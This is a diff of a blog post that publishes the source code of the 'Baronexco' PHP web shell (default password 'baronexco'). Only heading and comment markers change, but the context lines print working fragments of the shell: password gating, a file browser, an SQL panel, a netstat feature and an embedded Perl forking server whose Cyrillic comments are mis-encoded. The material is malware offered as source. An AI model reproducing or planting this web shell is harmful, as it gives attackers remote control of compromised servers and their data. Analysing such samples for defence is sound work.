@@ -12,14 +12,14 @@ tags:
 ---
 I don&#8217;t know what this script is called, but the default password seems to be &#8216;baronexco&#8217;, so that&#8217;s the name I&#8217;ve give it.
 
-## Baronexco Shell Source Code
+### Baronexco Shell Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?
 @session_start();
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 error_reporting(E_ALL & ~E_NOTICE);
-#####cfg#####
+#######cfg#######
 # use password  true / false #
 $create_password = true;
 $password = "baronexco";    // default password for nstview, you can change it.
@@ -103,9 +103,9 @@ Show open ports (nst) netstat -an
 
 
 
-######ver####
+#########ver######
 $ver= "v2.1";
-#############
+###################
 $pass=$_POST['pass'];
 if($pass==$password){
 $_SESSION['nst']="$pass";
@@ -358,7 +358,7 @@ exit;
 
 if(@$_GET['p']=="sql"){
 print "&lt;tr&gt;&lt;td&gt;";
-###
+####
 
 $f_d = $_GET['f_d'];
 if(!isset($f_d)){$f_d=".";}
@@ -821,7 +821,7 @@ print "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 } # end $conn
 
 
-###   end of sql
+####   end of sql
 print "&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 print $copyr;
 die;
@@ -1525,7 +1525,7 @@ use POSIX;
 
 \$DIR = undef;
 
-## Âûâîäèòü ëîã ñîáûòèé (1-äà, 0-íåò)
+### Âûâîäèòü ëîã ñîáûòèé (1-äà, 0-íåò)
 \$log=0;
 
 
@@ -1569,7 +1569,7 @@ while (1) {
         if (!defined(\$pid)) {
                 print STDERR \"Íåâîçìîæíî âûïîëíèòü fork: \$!\n\";
     } elsif (\$pid == 0) {
-## Íîâûé ïðîöåññ
+### Íîâûé ïðîöåññ
                 \$ah-&gt;close();
                 Run(\%o, \$ch, \$num);
         } else {
